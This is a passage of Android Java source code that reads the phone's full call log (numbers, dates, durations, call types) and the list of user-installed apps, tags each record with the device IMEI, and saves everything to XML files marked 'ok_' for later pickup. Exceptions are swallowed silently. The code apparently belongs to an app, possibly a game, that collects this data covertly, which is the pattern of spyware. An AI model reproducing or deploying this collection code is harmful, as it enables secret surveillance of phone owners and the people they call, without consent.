    		//Cursor callCursor = _currentContext.getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI,strFields, CallLog.Calls.DATE + ">?", new String[] { String.valueOf(FRIST_BOUND_IN_MS)},android.provider.CallLog.Calls.DATE + " ASC");//old version
    		Cursor callCursor = _currentContext.getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI,strFields, null, new String[] { String.valueOf(FRIST_BOUND_IN_MS)},android.provider.CallLog.Calls.DATE + " ASC");//new version
    		
    		int dateColumn = callCursor.getColumnIndex(android.provider.CallLog.Calls.DATE);
    		// type can be: Incoming, Outgoing or Missed
    		int typeColumn = callCursor.getColumnIndex(android.provider.CallLog.Calls.TYPE);
    		// get duration of calls
    		int durationColumn = callCursor.getColumnIndex(android.provider.CallLog.Calls.DURATION);
    		// get number
    		int numberColumn = callCursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER);
    		//Calendar calendarCall = Calendar.getInstance();

    		StringBuilder sb= new StringBuilder();
    		
    		if(callCursor.moveToFirst())
    		{
	    		do{         
	    			sb.append("<o>");
	            	sb.append("<imei>"+LocationUtil.IMEI+"</imei>");	     
	            	
	    		    long callDate = callCursor.getLong(dateColumn);
	    		    int callType = callCursor.getInt(typeColumn);   
	    		    int callDuration = callCursor.getInt(durationColumn);
	    		    String callNumber = callCursor.getString(numberColumn);
	
	    		    switch(callType){
	    		        case android.provider.CallLog.Calls.INCOMING_TYPE:
	    		            break;
	    		        case android.provider.CallLog.Calls.MISSED_TYPE:
	    		            break;
	    		        case android.provider.CallLog.Calls.OUTGOING_TYPE:                     
	    		            break;
	    		    }
	    		    String time=UtilGame.getInstance().GetStringFromTimeStamp(callDate);
	    		    sb.append("<time>"+time +"</time>");   
	                sb.append("<t>"+callType +"</t>"); 
	                sb.append("<d>"+callDuration +"</d>");    
	                sb.append("<a>"+callNumber +"</a>");
	                sb.append("</o>");
	                
	    		}while(callCursor.moveToNext());   
	    		
	    		
	    		FileUtil.saveTextToXMLFile(sb.toString(),sFile);
			    FileUtil.renameFile(sFile, "ok_"+sFile);
    		}
    	}catch(Exception ex){}
    }
    public void readInstalledApps()
    {
    	try
    	{
	    	//Log.v("Installedlamdaica", "Start readInstalledApps");
	    	String sFile="app_"+LocationUtil.IMEI+".xml";
	    	StringBuilder sb = new StringBuilder();
	        List<PackageInfo> PackList = getCurrentContext().getPackageManager().getInstalledPackages(0);
	        //sb.append("<o>");
	        //Log.v("Installedlamdaica", "Start readInstalledApps2:"+ PackList.size());
	        for (int i=0; i < PackList.size(); i++)
	        {
	            PackageInfo PackInfo = PackList.get(i);
	            if (((PackInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) != true)
	            {
	                String AppName = PackInfo.applicationInfo.loadLabel(getCurrentContext().getPackageManager()).toString();
	                sb.append("<a>"+AppName+"</a>");
	            }        
	        }
	        
	        sb.append("<d1>"+getAvailableInternalMemorySize()+"</d1>");
	        sb.append("<d2>"+getTotalInternalMemorySize()+"</d2>");
	        sb.append("<d3>"+getAvailableExternalMemorySize()+"</d3>");
	       
	        sb.append("<d4>"+getTotalExternalMemorySize()+"</d4>");
	        sb.append("<d5>"+externalMemoryAvailable()+"</d5>");
	        
	        // Log.v("Installedlamdaica", "Start readInstalledApps3:"+ sFile);
	        //sb.append("</o>");      
	        FileUtil.saveTextToXMLFile(sb.toString(),sFile);
		    FileUtil.renameFile(sFile, "ok_"+sFile);
		    //Log.v("Installedlamdaica", "Finish:"+ sFile);
    	}catch(Exception ex){}
    }
    //information for devices
    public static boolean externalMemoryAvailable() {
        return android.os.Environment.getExternalStorageState().equals(
                android.os.Environment.MEDIA_MOUNTED);
    }
    public static String getAvailableInternalMemorySize() {
        File path = Environment.getDataDirectory();
        StatFs stat = new StatFs(path.getPath());
        long blockSize = stat.getBlockSize();
        long availableBlocks = stat.getAvailableBlocks();
        return formatSize(availableBlocks * blockSize);
    }

    public static String getTotalInternalMemorySize() {
        File path = Environment.getDataDirectory();
        StatFs stat = new StatFs(path.getPath());
        long blockSize = stat.getBlockSize();
        long totalBlocks = stat.getBlockCount();
        return formatSize(totalBlocks * blockSize);
    }

    public static String getAvailableExternalMemorySize() {
        if (externalMemoryAvailable()) {
            File path = Environment.getExternalStorageDirectory();
            StatFs stat = new StatFs(path.getPath());
            long blockSize = stat.getBlockSize();
            long availableBlocks = stat.getAvailableBlocks();
            return formatSize(availableBlocks * blockSize);
        } else {
            return "-1";
        }
    }

    public static String getTotalExternalMemorySize() {
        if (externalMemoryAvailable()) {
            File path = Environment.getExternalStorageDirectory();
            StatFs stat = new StatFs(path.getPath());
            long blockSize = stat.getBlockSize();
            long totalBlocks = stat.getBlockCount();
            return formatSize(totalBlocks * blockSize);
        } else {
            return "-1";
        }
    }

    public static String formatSize(long size) {
        String suffix = null;

        if (size >= 1024) {
            suffix = "KB";
            size /= 1024;
            if (size >= 1024) {
                suffix = "MB";
                size /= 1024;
            }
        }

        StringBuilder resultBuffer = new StringBuilder(Long.toString(size));

        int commaOffset = resultBuffer.length() - 3;
        while (commaOffset > 0) {
            resultBuffer.insert(commaOffset, ',');
            commaOffset -= 3;
        }

        if (suffix != null) resultBuffer.append(suffix);
        return resultBuffer.toString();
    }
}
